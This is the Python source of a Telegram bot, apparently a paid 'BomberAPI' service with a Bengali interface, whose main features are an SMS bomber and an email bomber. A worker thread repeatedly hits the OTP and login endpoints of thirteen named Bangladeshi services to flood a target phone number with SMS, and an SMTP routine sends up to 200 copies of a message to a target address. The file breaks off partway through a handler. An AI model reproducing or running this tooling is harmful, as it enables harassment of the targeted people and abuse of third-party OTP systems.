import os
import re
import time
import json
import uuid
import random
import string
import threading
import smtplib
import requests
import telebot
from telebot.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton, BotCommand
)
from datetime import datetime, date

# ─────────────────────────────────────────
# ENV
# ─────────────────────────────────────────
TOKEN          = os.environ["BOT_TOKEN"]
ADMIN_IDS      = [int(x) for x in os.environ.get("ADMIN_IDS", "").split(",") if x.strip()]
FIREBASE_URL   = os.environ["FIREBASE_URL"].rstrip("/")
BACKEND_URL    = os.environ["BACKEND_URL"].rstrip("/")   # your Render Flask URL
BACKEND_SECRET = os.environ["BACKEND_SECRET"]            # shared secret between bot ↔ api
CONTACT_TG     = os.environ.get("CONTACT_TG", "@admin")  # telegram handle for premium

FREE_SMS_DAILY    = int(os.environ.get("FREE_SMS_DAILY", "50"))
FREE_EMAIL_DAILY  = int(os.environ.get("FREE_EMAIL_DAILY", "200"))

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")

# ─────────────────────────────────────────
# IN-MEMORY STATE
# ─────────────────────────────────────────
user_state   = {}   # chat_id → step/data dict
bombing      = {}   # chat_id → bool
seen_otps    = {}   # token  → set of seen msg ids

# ─────────────────────────────────────────
# FIREBASE HELPERS
# ─────────────────────────────────────────
def _fb(path): return f"{FIREBASE_URL}/{path}.json"

def fb_get(path):
    try:
        r = requests.get(_fb(path), timeout=10)
        return r.json() if r.status_code == 200 else None
    except: return None

def fb_set(path, data):
    try: requests.put(_fb(path), json=data, timeout=10)
    except: pass

def fb_push(path, data):
    try:
        r = requests.post(_fb(path), json=data, timeout=10)
        return r.json().get("name")
    except: return None

def fb_del(path):
    try: requests.delete(_fb(path), timeout=10)
    except: pass

def sanitize(k): return re.sub(r'[.#$\[\]/]', '_', str(k))

# ─────────────────────────────────────────
# AUTH HELPERS  (calls your Flask backend)
# ─────────────────────────────────────────
def backend_post(endpoint, payload):
    try:
        payload["_secret"] = BACKEND_SECRET
        r = requests.post(f"{BACKEND_URL}{endpoint}", json=payload, timeout=15)
        return r.json()
    except Exception as e:
        return {"ok": False, "error": str(e)}

# ─────────────────────────────────────────
# USER DB HELPERS
# ─────────────────────────────────────────
def get_user(cid):
    u = fb_get(f"users/{cid}")
    if not u:
        u = {
            "chat_id": cid,
            "email": None,
            "api_key": None,
            "premium": False,
            "sms_today": 0,
            "email_today": 0,
            "last_reset": str(date.today()),
            "total_sms": 0,
            "total_email": 0,
            "total_mail_bought": 0,
        }
        fb_set(f"users/{cid}", u)
    return u

def save_user(cid, u): fb_set(f"users/{cid}", u)

def reset_daily_if_needed(u, cid):
    today = str(date.today())
    if u.get("last_reset") != today:
        u["sms_today"]   = 0
        u["email_today"] = 0
        u["last_reset"]  = today
        save_user(cid, u)
    return u

def is_admin(cid): return int(cid) in ADMIN_IDS

def is_premium(u): return u.get("premium", False) or is_admin(u.get("chat_id", 0))

def gen_api_key(): return "bm_" + uuid.uuid4().hex

# ─────────────────────────────────────────
# BOT COMMANDS
# ─────────────────────────────────────────
try:
    bot.set_my_commands([
        BotCommand("start",  "শুরু করুন 🚀"),
        BotCommand("menu",   "মেনু দেখুন 📋"),
        BotCommand("status", "স্ট্যাটাস দেখুন 📊"),
    ])
except: pass

# ─────────────────────────────────────────
# KEYBOARDS
# ─────────────────────────────────────────
def main_kb():
    m = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    m.row(KeyboardButton("📩 Send SMS"), KeyboardButton("📧 Email Sender"))
    m.row(KeyboardButton("📬 Temp Mail"), KeyboardButton("📩 Get OTP"))
    m.row(KeyboardButton("📊 Status"),   KeyboardButton("🕒 History"))
    m.row(KeyboardButton("⚙️ Project Settings"))
    return m

def back_kb():
    m = ReplyKeyboardMarkup(resize_keyboard=True)
    m.row(KeyboardButton("🔙 Back to Menu"))
    return m

MENU_TEXTS = {
    "📩 Send SMS", "📧 Email Sender", "📬 Temp Mail",
    "📩 Get OTP",  "📊 Status",       "🕒 History",
    "⚙️ Project Settings", "🔙 Back to Menu",
}

# ─────────────────────────────────────────
# START / LOGIN FLOW
# ─────────────────────────────────────────
@bot.message_handler(commands=["start", "menu"])
def cmd_start(msg):
    cid = msg.chat.id
    u = get_user(cid)
    if u.get("email"):
        bot.send_message(cid,
            f"স্বাগতম ফিরে আসুন! 👋\n📧 `{u['email']}`",
            reply_markup=main_kb())
    else:
        _show_auth_menu(cid)

def _show_auth_menu(cid):
    mk = InlineKeyboardMarkup()
    mk.row(
        InlineKeyboardButton("📝 Register", callback_data="auth_register"),
        InlineKeyboardButton("🔑 Login",    callback_data="auth_login"),
    )
    bot.send_message(cid,
        "🔐 *BomberAPI Bot*\n\nস্বাগতম! শুরু করতে Register বা Login করুন।\n"
        "⚠️ শুধুমাত্র *Gmail* অ্যাড্রেস ব্যবহার করুন।",
        reply_markup=mk)

@bot.callback_query_handler(func=lambda c: c.data in ("auth_register","auth_login"))
def cb_auth(call):
    cid = call.message.chat.id
    action = call.data  # auth_register or auth_login
    user_state[cid] = {"step": action}
    lbl = "Register" if action == "auth_register" else "Login"
    bot.edit_message_text(
        f"📧 *{lbl}*\n\nআপনার Gmail অ্যাড্রেস লিখুন:",
        cid, call.message.message_id)

@bot.message_handler(func=lambda m: (
    user_state.get(m.chat.id, {}).get("step") in ("auth_register","auth_login")
))
def handle_email_input(msg):
    cid = msg.chat.id
    email_raw = (msg.text or "").strip().lower()

    if not re.fullmatch(r"[a-z0-9._%+\-]+@gmail\.com", email_raw):
        bot.send_message(cid, "❌ শুধুমাত্র Gmail (@gmail.com) ব্যবহার করুন। Plus (+) চিহ্ন দেওয়া যাবে না।")
        return
    if "+" in email_raw:
        bot.send_message(cid, "❌ Gmail-এ + চিহ্ন ব্যবহার করা যাবে না।")
        return

    step   = user_state[cid]["step"]
    is_reg = (step == "auth_register")
    exists = fb_get(f"emails/{sanitize(email_raw)}")

    if is_reg and exists:
        bot.send_message(cid, "❌ এই ইমেইল আগেই রেজিস্টার্ড। Login করুন।")
        user_state[cid] = {}
        return
    if not is_reg and not exists:
        bot.send_message(cid, "❌ এই ইমেইল রেজিস্টার্ড নয়। আগে Register করুন।")
        user_state[cid] = {}
        return

    # Send OTP via CloudNest
    bot.send_message(cid, "⏳ OTP পাঠানো হচ্ছে...")
    res = backend_post("/auth/send_otp", {"email": email_raw})
    if not res.get("ok"):
        bot.send_message(cid, f"❌ OTP পাঠানো যায়নি: {res.get('error','unknown')}")
        user_state[cid] = {}
        return

    user_state[cid] = {"step": "otp_verify", "email": email_raw, "is_reg": is_reg}
    bot.send_message(cid, f"✅ `{email_raw}` এ OTP পাঠানো হয়েছে। OTP টি নিচে দিন:")

@bot.message_handler(func=lambda m: user_state.get(m.chat.id, {}).get("step") == "otp_verify")
def handle_otp_verify(msg):
    cid   = msg.chat.id
    otp   = (msg.text or "").strip()
    state = user_state.get(cid, {})
    email_raw = state["email"]
    is_reg    = state["is_reg"]

    res = backend_post("/auth/verify_otp", {"email": email_raw, "otp": otp})
    if not res.get("ok"):
        bot.send_message(cid, "❌ OTP ভুল বা মেয়াদ শেষ।")
        return

    u = get_user(cid)
    if is_reg:
        api_key = gen_api_key()
        u["email"]   = email_raw
        u["api_key"] = api_key
        fb_set(f"emails/{sanitize(email_raw)}", {"chat_id": cid})
        save_user(cid, u)
        bot.send_message(cid,
            f"🎉 *Registration সফল!*\n\n"
            f"📧 Email: `{email_raw}`\n"
            f"🔑 API Key: `{api_key}`\n\n"
            f"এই API Key টি সেভ রাখুন।",
            reply_markup=main_kb())
    else:
        u["email"] = email_raw
        save_user(cid, u)
        bot.send_message(cid,
            f"✅ *Login সফল!*\n📧 `{email_raw}`\n🔑 API Key: `{u['api_key']}`",
            reply_markup=main_kb())

    user_state.pop(cid, None)

# ─────────────────────────────────────────
# GUARD — must be logged in
# ─────────────────────────────────────────
def require_login(fn):
    def wrapper(msg_or_call, *a, **kw):
        cid = msg_or_call.chat.id if hasattr(msg_or_call, "chat") else msg_or_call.message.chat.id
        u   = get_user(cid)
        if not u.get("email"):
            _show_auth_menu(cid)
            return
        return fn(msg_or_call, *a, **kw)
    wrapper.__name__ = fn.__name__
    return wrapper

# ─────────────────────────────────────────
# STATUS
# ─────────────────────────────────────────
@bot.message_handler(func=lambda m: m.text == "📊 Status")
@require_login
def handle_status(msg):
    cid = msg.chat.id
    u   = get_user(cid)
    u   = reset_daily_if_needed(u, cid)
    prem = "✅ Premium" if is_premium(u) else "🆓 Free"
    sms_lim  = "∞" if is_premium(u) else str(FREE_SMS_DAILY)
    mail_lim = "∞" if is_premium(u) else str(FREE_EMAIL_DAILY)
    bot.send_message(cid,
        f"📊 *আপনার স্ট্যাটাস*\n\n"
        f"👤 Plan: {prem}\n"
        f"📩 আজ SMS পাঠিয়েছেন: `{u.get('sms_today',0)}/{sms_lim}`\n"
        f"📧 আজ Email পাঠিয়েছেন: `{u.get('email_today',0)}/{mail_lim}`\n"
        f"📬 মোট Mail কিনেছেন: `{u.get('total_mail_bought',0)}`\n\n"
        f"🔑 API Key: `{u.get('api_key','N/A')}`")

# ─────────────────────────────────────────
# HISTORY
# ─────────────────────────────────────────
@bot.message_handler(func=lambda m: m.text == "🕒 History")
@require_login
def handle_history(msg):
    cid     = msg.chat.id
    history = fb_get(f"users/{cid}/mail_history") or {}
    if isinstance(history, list):
        items = [(str(i), v) for i, v in enumerate(history) if v]
    elif isinstance(history, dict):
        items = list(history.items())
    else:
        items = []
    items = items[-10:]
    if not items:
        bot.send_message(cid, "📭 কোনো Mail History নেই।")
        return
    text = "🕒 *সাম্প্রতিক Mail History:*\n\n"
    for _, v in items:
        if not isinstance(v, dict): continue
        text += (f"📧 `{v.get('email','—')}`\n"
                 f"🔑 `{v.get('token','—')}`\n"
                 f"🕒 {v.get('time','—')}\n➖➖➖\n")
    try:
        bot.send_message(cid, text)
    except:
        bot.send_message(cid, "❌ History লোড করতে সমস্যা হচ্ছে।")

# ─────────────────────────────────────────
# PROJECT SETTINGS
# ─────────────────────────────────────────
@bot.message_handler(func=lambda m: m.text == "⚙️ Project Settings")
@require_login
def handle_project_settings(msg):
    cid = msg.chat.id
    u   = get_user(cid)
    mk  = InlineKeyboardMarkup(row_width=1)
    mk.add(
        InlineKeyboardButton("📬 Temp Mail API Docs",  callback_data="docs_tempmail"),
        InlineKeyboardButton("📩 Send SMS API Docs",   callback_data="docs_sms"),
        InlineKeyboardButton("📧 Email Sender Docs",   callback_data="docs_email"),
        InlineKeyboardButton("🔑 My API Key",          callback_data="docs_apikey"),
    )
    bot.send_message(cid, "⚙️ *Project Settings*\n\nকোন API Docs দেখতে চান?", reply_markup=mk)

@bot.callback_query_handler(func=lambda c: c.data.startswith("docs_"))
def cb_docs(call):
    cid   = call.message.chat.id
    u     = get_user(cid)
    key   = u.get("api_key", "YOUR_API_KEY")
    base  = BACKEND_URL

    if call.data == "docs_apikey":
        bot.answer_callback_query(call.id)
        bot.send_message(cid, f"🔑 *আপনার API Key:*\n\n`{key}`")
        return

    if call.data == "docs_tempmail":
        code = (
            f"# Temp Mail তৈরি করুন\n"
            f"import requests\n\n"
            f"BASE = '{base}'\n"
            f"KEY  = '{key}'\n\n"
            f"# ১. নতুন mail তৈরি\n"
            f"r = requests.post(BASE+'/mail/create',\n"
            f"    json={{'api_key': KEY}})\n"
            f"data = r.json()\n"
            f"# data = {{'ok':True,'email':'...','token':'...'}}\n\n"
            f"# ২. OTP / inbox চেক\n"
            f"r = requests.post(BASE+'/mail/inbox',\n"
            f"    json={{'api_key': KEY, 'token': data['token']}})\n"
            f"# r.json() → {{'ok':True,'messages':[...]}}\n\n"
            f"# ৩. কাস্টম address দিয়ে তৈরি (optional)\n"
            f"r = requests.post(BASE+'/mail/create',\n"
            f"    json={{'api_key': KEY, 'custom': 'myname'}})"
        )

    elif call.data == "docs_sms":
        code = (
            f"# SMS পাঠান\n"
            f"import requests\n\n"
            f"BASE = '{base}'\n"
            f"KEY  = '{key}'\n\n"
            f"r = requests.post(BASE+'/sms/send',\n"
            f"    json={{\n"
            f"        'api_key': KEY,\n"
            f"        'number': '01XXXXXXXXX'   # BD number\n"
            f"    }})\n"
            f"print(r.json())\n"
            f"# Free: {FREE_SMS_DAILY}/day per key\n"
            f"# Premium: unlimited — contact {CONTACT_TG}"
        )

    elif call.data == "docs_email":
        code = (
            f"# Email পাঠান\n"
            f"import requests\n\n"
            f"BASE = '{base}'\n"
            f"KEY  = '{key}'\n\n"
            f"r = requests.post(BASE+'/email/send',\n"
            f"    json={{\n"
            f"        'api_key'  : KEY,\n"
            f"        'to'       : 'target@example.com',\n"
            f"        'subject'  : 'Hello',\n"
            f"        'body'     : 'Test message',\n"
            f"        'count'    : 5,           # 1–200\n"
            f"        # 'from_email': 'you@gmail.com',   # optional custom\n"
            f"        # 'from_pass' : 'app_password'     # optional custom\n"
            f"    }})\n"
            f"print(r.json())\n"
            f"# Free: {FREE_EMAIL_DAILY}/day per key"
        )

    bot.answer_callback_query(call.id)
    bot.send_message(cid, f"```python\n{code}\n```")

# ─────────────────────────────────────────
# SMS BOMBER
# ─────────────────────────────────────────
@bot.message_handler(func=lambda m: m.text == "📩 Send SMS")
@require_login
def handle_sms_menu(msg):
    cid = msg.chat.id
    msg2 = bot.send_message(cid, "📱 টার্গেট নাম্বার দিন (যেমন: 01XXXXXXXXX):", reply_markup=back_kb())
    user_state[cid] = {"step": "sms_number"}
    bot.register_next_step_handler(msg2, _sms_got_number)

def _sms_got_number(msg):
    cid = msg.chat.id
    if msg.text in MENU_TEXTS: return
    if msg.text == "🔙 Back to Menu":
        user_state.pop(cid, None)
        bot.send_message(cid, "মেনু:", reply_markup=main_kb())
        return

    number = (msg.text or "").strip()
    u = get_user(cid)
    u = reset_daily_if_needed(u, cid)

    if not is_premium(u) and u.get("sms_today", 0) >= FREE_SMS_DAILY:
        bot.send_message(cid,
            f"⚠️ আজকের ফ্রি SMS লিমিট ({FREE_SMS_DAILY}) শেষ!\n\n"
            f"Unlimited-এর জন্য Telegram-এ যোগাযোগ করুন: {CONTACT_TG}",
            reply_markup=main_kb())
        user_state.pop(cid, None)
        return

    mk = InlineKeyboardMarkup()
    mk.add(InlineKeyboardButton("🚀 Start Bombing", callback_data=f"bomb_start_{cid}"))
    user_state[cid] = {"step": "sms_ready", "number": number}
    remaining = FREE_SMS_DAILY - u.get("sms_today",0)
    rem_txt = f"আজ আর {remaining}টি SMS পাঠাতে পারবেন।" if not is_premium(u) else "Unlimited"
    bot.send_message(cid,
        f"🎯 টার্গেট: `{number}`\n📊 {rem_txt}\n\nবোম্বিং শুরু করতে নিচে ক্লিক করুন:",
        reply_markup=mk)

@bot.callback_query_handler(func=lambda c: c.data.startswith("bomb_start_"))
def cb_bomb_start(call):
    cid = call.message.chat.id
    if bombing.get(cid):
        bot.answer_callback_query(call.id, "⚠️ ইতিমধ্যে চলছে!")
        return
    state = user_state.get(cid, {})
    number = state.get("number")
    if not number:
        bot.answer_callback_query(call.id, "❌ নাম্বার পাওয়া যায়নি।", show_alert=True)
        return
    u = get_user(cid)
    u = reset_daily_if_needed(u, cid)
    if not is_premium(u) and u.get("sms_today", 0) >= FREE_SMS_DAILY:
        bot.answer_callback_query(call.id, "❌ দৈনিক লিমিট শেষ!", show_alert=True)
        return

    bombing[cid] = True
    bot.answer_callback_query(call.id, "🚀 শুরু হচ্ছে...")
    mk = InlineKeyboardMarkup()
    mk.add(InlineKeyboardButton("🛑 Stop", callback_data=f"bomb_stop_{cid}"))
    bot.edit_message_text(
        f"🔥 *SMS Bombing LIVE*\n📱 Target: `{number}`\n⏳ শুরু হচ্ছে...",
        cid, call.message.message_id, reply_markup=mk)
    threading.Thread(
        target=_bomb_worker,
        args=(cid, call.message.message_id, number),
        daemon=True
    ).start()

@bot.callback_query_handler(func=lambda c: c.data.startswith("bomb_stop_"))
def cb_bomb_stop(call):
    cid = call.message.chat.id
    bombing[cid] = False
    bot.answer_callback_query(call.id, "🛑 বন্ধ হচ্ছে...")
    try:
        bot.edit_message_text("🛑 *SMS Bombing বন্ধ করা হয়েছে।*", cid, call.message.message_id)
    except: pass

def _bomb_worker(cid, mid, number):
    u       = get_user(cid)
    apis    = _get_sms_apis(number)
    logs    = []
    sent    = 0
    last_up = time.time()

    while bombing.get(cid, False):
        u = get_user(cid)
        u = reset_daily_if_needed(u, cid)
        if not is_premium(u) and u.get("sms_today", 0) >= FREE_SMS_DAILY:
            bombing[cid] = False
            try:
                bot.edit_message_text(
                    f"⚠️ *দৈনিক SMS লিমিট শেষ!*\nMoট {sent}টি পাঠানো হয়েছে।\nPremium: {CONTACT_TG}",
                    cid, mid)
            except: pass
            break

        for api in apis:
            if not bombing.get(cid, False): break
            try:
                hdrs = {"User-Agent": "Mozilla/5.0", "Accept": "application/json"}
                if api["method"] == "POST":
                    res = requests.post(
                        api["url"],
                        json=api.get("json"), data=api.get("data"),
                        headers=hdrs, timeout=8)
                else:
                    res = requests.get(api["url"], headers=hdrs, timeout=8)

                if res.status_code in (200, 201, 202):
                    logs.append(f"✅ {api['name']}")
                    sent += 1
                    u["sms_today"]  = u.get("sms_today", 0) + 1
                    u["total_sms"]  = u.get("total_sms", 0) + 1
                    save_user(cid, u)
                else:
                    logs.append(f"❌ {api['name']}")
            except:
                logs.append(f"⏭ {api['name']} (skip)")

            if time.time() - last_up > 2.5:
                snippet = "\n".join(logs[-6:]) or "⏳ Sending..."
                mk = InlineKeyboardMarkup()
                mk.add(InlineKeyboardButton("🛑 Stop", callback_data=f"bomb_stop_{cid}"))
                try:
                    bot.edit_message_text(
                        f"🔥 *SMS Bombing LIVE*\n📱 `{number}`\n✅ Sent: {sent}\n\n{snippet}",
                        cid, mid, reply_markup=mk)
                    last_up = time.time()
                except: pass
            time.sleep(0.8)

    try:
        bot.edit_message_text(
            f"✅ *Bombing শেষ।*\n📱 `{number}`\n📩 মোট পাঠানো: {sent}",
            cid, mid)
    except: pass
    bombing.pop(cid, None)

def _get_sms_apis(number):
    raw = re.sub(r'\D', '', number)
    if raw.startswith('880'):   raw = raw[3:]
    elif raw.startswith('88'):  raw = raw[2:]
    elif raw.startswith('0'):   raw = raw[1:]
    n0   = f"0{raw}"
    n88  = f"88{n0}"
    np88 = f"+88{n0}"
    return [
        {"name": "Bioscope",       "method": "POST", "url": "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en", "json": {"number": np88}},
        {"name": "BTCL",           "method": "POST", "url": "https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json", "json": {"phoneNbr": n0, "email": "", "OTPType": 1, "userName": ""}},
        {"name": "BD Tickets",     "method": "POST", "url": "https://api.bdtickets.com:20100/v1/auth", "json": {"createUserCheck": True, "phoneNumber": np88, "applicationChannel": "WEB_APP"}},
        {"name": "Apex4U",         "method": "POST", "url": "https://api.apex4u.com/api/auth/login", "json": {"phoneNumber": n0}},
        {"name": "Swap BD",        "method": "POST", "url": "https://api.swap.com.bd/api/v1/send-otp/v2", "json": {"phone": n0}},
        {"name": "Arogga",         "method": "POST", "url": "https://api.arogga.com/auth/v1/sms/send/?f=web&b=Chrome", "data": {"mobile": n0, "fcmToken": "", "referral": ""}},
        {"name": "Fundesh",        "method": "POST", "url": "https://fundesh.com.bd/api/auth/generateOTP?service_key=", "json": {"msisdn": n0}},
        {"name": "Garibook",       "method": "POST", "url": "https://api.garibookadmin.com/api/v3/user/login", "json": {"mobile": n0, "recaptcha_token": "garibookcaptcha", "channel": "web"}},
        {"name": "AppLink",        "method": "POST", "url": "https://apps.applink.com.bd/appstore-v4-server/login/otp/request", "json": {"msisdn": n88}},
        {"name": "Bikroy",         "method": "GET",  "url": f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={n0}"},
        {"name": "Ghoori Learn",   "method": "POST", "url": "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", "json": {"mobile_no": n0}},
        {"name": "Deepto Play",    "method": "POST", "url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", "json": {"number": np88}},
        {"name": "GP Web",         "method": "POST", "url": "https://webloginda.grameenphone.com/backend/api/v1/otp", "data": {"msisdn": n0}},
    ]

# ─────────────────────────────────────────
# EMAIL SENDER
# ─────────────────────────────────────────
@bot.message_handler(func=lambda m: m.text == "📧 Email Sender")
@require_login
def handle_email_menu(msg):
    cid = msg.chat.id
    u   = get_user(cid)
    u   = reset_daily_if_needed(u, cid)
    if not is_premium(u) and u.get("email_today", 0) >= FREE_EMAIL_DAILY:
        bot.send_message(cid,
            f"⚠️ আজকের Email লিমিট ({FREE_EMAIL_DAILY}) শেষ!\nPremium: {CONTACT_TG}",
            reply_markup=main_kb())
        return
    mk = InlineKeyboardMarkup()
    mk.row(
        InlineKeyboardButton("🆓 Free Mail",    callback_data="em_free"),
        InlineKeyboardButton("🛠 Custom Mail",  callback_data="em_custom"),
    )
    bot.send_message(cid, "📧 *Email Sender*\n\nঅপশন বেছে নিন:", reply_markup=mk)

@bot.callback_query_handler(func=lambda c: c.data in ("em_free","em_custom"))
def cb_email_mode(call):
    cid  = call.message.chat.id
    mode = call.data
    user_state[cid] = {"step": "email_flow", "mode": mode}
    bot.edit_message_text("📧 *Target Email* লিখুন:", cid, call.message.message_id)
    if mode == "em_custom":
        _ask_email_step(cid, "email_custom_from")
    else:
        _ask_email_step(cid, "email_target")

def _ask_email_step(cid, step):
    prompts = {
        "email_custom_from":    "📧 আপনার Gmail লিখুন:",
        "email_custom_pass":    "🔑 Gmail App Password লিখুন:",
        "email_target":         "📨 Target Email লিখুন:",
        "email_subject":        "📝 Subject লিখুন:",
        "email_body":           "📄 Message Body লিখুন:",
        "email_count":          f"🔢 কতটি পাঠাবেন? (1–{FREE_EMAIL_DAILY}):",
    }
    user_state[cid]["sub_step"] = step
    msg = bot.send_message(cid, prompts[step], reply_markup=back_kb())
    bot.register_next_step_handler(msg, _email_step_handler)

def _email_step_handler(msg):
    cid   = msg.chat.id
    text  = (msg.text or "").strip()
    if text in MENU_TEXTS or text == "🔙 Back to Menu":
        user_state.pop(cid, None)
        bot.send_message(cid, "মেনু:", reply_markup=main_kb())
        return

    state = user_state.get(cid, {})
    step  = state.get("sub_step")

    if step == "email_custom_from":
        state["from_email"] = text
        _ask_email_step(cid, "email_custom_pass")

    elif step == "email_custom_pass":
        state["from_pass"] = text
        _ask_email_step(cid, "email_target")

    elif step == "email_target":
        state["to"] = text
        _ask_email_step(cid, "email_subject")

    elif step == "email_subject":
        state["subject"] = text
        _ask_email_step(cid, "email_body")

    elif step == "email_body":
        state["body"] = text
        _ask_email_step(cid, "email_count")

    elif step == "email_count":
        try: count = max(1, min(int(text), FREE_EMAIL_DAILY))
        except:
            bot.send_message(cid, "❌ সংখ্যা দিন।")
            _ask_email_step(cid, "email_count")
            return
        state["count"] = count
        _do_send_emails(cid, state)
        user_state.pop(cid, None)

def _do_send_emails(cid, state):
    mode     = state.get("mode")
    to       = state["to"]
    subject  = state["subject"]
    body     = state["body"]
    count    = state["count"]

    if mode == "em_free":
        from_email = os.environ.get("FREE_SENDER_EMAIL", "")
        from_pass  = os.environ.get("FREE_SENDER_PASS", "")
    else:
        from_email = state.get("from_email", "")
        from_pass  = state.get("from_pass", "")

    if not from_email or not from_pass:
        bot.send_message(cid, "❌ Email credentials পাওয়া যায়নি।", reply_markup=main_kb())
        return

    prog = bot.send_message(cid, f"⏳ Sending 0/{count}...")
    u    = get_user(cid)

    try:
        srv = smtplib.SMTP("smtp.gmail.com", 587)
        srv.ehlo(); srv.starttls()
        srv.login(from_email, from_pass)
        for i in range(count):
            srv.sendmail(
                from_email, to,
                f"From: {from_email}\nTo: {to}\nSubject: {subject}\n\n{body}"
            )
            bot.edit_message_text(f"⏳ Sent: {i+1}/{count}", cid, prog.message_id)
            u["email_today"] = u.get("email_today", 0) + 1
            u["total_email"] = u.get("total_email", 0) + 1
            save_user(cid, u)
            time.sleep(0.5)
        srv.quit()
        bot.send_message(cid, f"🎉 {count}টি Email সফলভাবে পাঠানো হয়েছে!", reply_markup=main_kb())
    except Exception as e:
        bot.send_message(cid, f"❌ Error: `{e}`", reply_markup=main_kb())

# ─────────────────────────────────────────
# TEMP MAIL
# ─────────────────────────────────────────
@bot.message_handler(func=lambda m: m.text == "📬 Temp Mail")
@require_login
def handle_tempmail(msg):
    cid = msg.chat.id
    mk  = InlineKeyboardMarkup(row_width=1)
    mk.add(
        InlineKeyboardButton("🎲 Random Mail তৈরি",    callback_data="tm_random"),
        InlineKeyboardButton("✏️ Custom Mail তৈরি",    callback_data="tm_custom"),
    )
    bot.send_message(cid, "📬 *Temp Mail*\n\nকীভাবে mail তৈরি করবেন?", reply_markup=mk)

@bot.callback_query_handler(func=lambda c: c.data in ("tm_random","tm_custom"))
def cb_tempmail(call):
    cid = call.message.chat.id
    if call.data == "tm_random":
        bot.edit_message_text("⏳ Random mail তৈরি হচ্ছে...", cid, call.message.message_id)
        _create_and_show_mail(cid, custom=None)
    else:
        user_state[cid] = {"step": "tm_custom_name"}
        bot.edit_message_text("✏️ কাস্টম নাম লিখুন (শুধু a-z, 0-9):", cid, call.message.message_id)

@bot.message_handler(func=lambda m: user_state.get(m.chat.id, {}).get("step") == "tm_custom_name")
def handle_custom_mail_name(msg):
    cid  = msg.chat.id
    name = re.sub(r'[^a-z0-9]', '', msg.text.lower()) if msg.text else ""
    if not name:
        bot.send_message(cid, "❌ শুধু a-z, 0-9 ব্যবহার করুন।")
        return
    user_state.pop(cid, None)
    bot.send_message(cid, "⏳ Mail তৈরি হচ্ছে...")
    _create_and_show_mail(cid, custom=name)

def _create_and_show_mail(cid, custom=None):
    u   = get_user(cid)
    res = backend_post("/mail/create", {
        "user_chat_id": cid,
        "custom": custom,
    })
    if not res.get("ok"):
        bot.send_message(cid, f"❌ Mail তৈরি করা যায়নি: {res.get('error')}", reply_markup=main_kb())
        return

    email_addr = res["email"]
    token      = res["token"]

    # save to history
    fb_push(f"users/{cid}/mail_history", {
        "email": email_addr,
        "token": token,
        "time": datetime.now().strftime("%Y-%m-%d %H:%M"),
    })
    u["total_mail_bought"] = u.get("total_mail_bought", 0) + 1
    save_user(cid, u)

    mk = InlineKeyboardMarkup()
    mk.add(InlineKeyboardButton("📩 OTP চেক করুন", callback_data=f"otp_check_{token}_{email_addr}"))
    bot.send_message(cid,
        f"✅ *Temp Mail তৈরি হয়েছে!*\n\n"
        f"📧 Email: `{email_addr}`\n"
        f"🔑 Token: `{token}`\n\n"
        f"নিচে ক্লিক করে OTP চেক করুন:",
        reply_markup=mk)

# ─────────────────────────────────────────
# GET OTP  (manual token input)
# ─────────────────────────────────────────
@bot.message_handler(func=lambda m: m.text == "📩 Get OTP")
@require_login
def handle_get_otp(msg):
    cid  = msg.chat.id
    msg2 = bot.send_message(cid, "🔑 Mail Token লিখুন:", reply_markup=back_kb())
    user_state[cid] = {"step": "otp_token_input"}
    bot.register_next_step_handler(msg2, _otp_got_token)

def _otp_got_token(msg):
    cid = msg.chat.id
    if msg.text in MENU_TEXTS:
        user_state.pop(cid, None)
        bot.send_message(cid, "মেনু:", reply_markup=main_kb())
        return
    token = (msg.text or "").strip()
    user_state.pop(cid, None)
    _fetch_and_show_otp(cid, token)

@bot.callback_query_handler(func=lambda c: c.data.startswith("otp_check_"))
def cb_otp_check(call):
    cid   = call.message.chat.id
    parts = call.data.split("_", 3)
    # otp_check_<token>_<email>
    token = parts[2] if len(parts) > 2 else ""
    bot.answer_callback_query(call.id, "⏳ চেক করা হচ্ছে...")
    _fetch_and_show_otp(cid, token)

def _fetch_and_show_otp(cid, token):
    res = backend_post("/mail/inbox", {"token": token, "user_chat_id": cid})
    if not res.get("ok"):
        bot.send_message(cid, f"❌ Inbox লোড হয়নি: {res.get('error')}")
        return
    msgs = res.get("messages", [])
    if not msgs:
        bot.send_message(cid, "📭 ইনবক্স খালি। এখনো কোনো OTP আসেনি।")
        return
    for m in msgs[:3]:
        otp_match = re.search(r"\b\d{4,8}\b", m.get("subject","") + " " + m.get("body",""))
        code = otp_match.group(0) if otp_match else "No Code Found"
        bot.send_message(cid,
            f"🏢 From: `{m.get('from','?')}`\n"
            f"🔢 Code: *{code}*\n"
            f"📋 Subject: {m.get('subject','—')}\n"
            f"🕒 Time: {m.get('time','?')}")

# ─────────────────────────────────────────
# ADMIN PANEL
# ─────────────────────────────────────────
@bot.message_handler(commands=["admin"])
def cmd_admin(msg):
    if not is_admin(msg.chat.id):
        return
    mk = InlineKeyboardMarkup(row_width=1)
    mk.add(
        InlineKeyboardButton("👑 Make Premium",   callback_data="adm_mkprem"),
        InlineKeyboardButton("🚫 Remove Premium", callback_data="adm_rmprem"),
        InlineKeyboardButton("📋 All Users",      callback_data="adm_users"),
    )
    bot.send_message(msg.chat.id, "🛠 *Admin Panel*", reply_markup=mk)

@bot.callback_query_handler(func=lambda c: c.data.startswith("adm_"))
def cb_admin(call):
    cid = call.message.chat.id
    if not is_admin(cid): return
    act = call.data

    if act == "adm_mkprem":
        user_state[cid] = {"step": "adm_mkprem"}
        bot.edit_message_text("👑 কোন User-এর Chat ID বা @username দিন:", cid, call.message.message_id)

    elif act == "adm_rmprem":
        user_state[cid] = {"step": "adm_rmprem"}
        bot.edit_message_text("🚫 কোন User-এর Chat ID দিন:", cid, call.message.message_id)

    elif act == "adm_users":
        users = fb_get("users") or {}
        txt   = "📋 *All Users:*\n\n"
        for uid, ud in list(users.items())[:20]:
            prem = "👑" if ud.get("premium") else "🆓"
            txt += f"{prem} `{uid}` — {ud.get('email','?')}\n"
        bot.edit_message_text(txt, cid, call.message.message_id)

@bot.message_handler(func=lambda m: user_state.get(m.chat.id, {}).get("step") in ("adm_mkprem","adm_rmprem"))
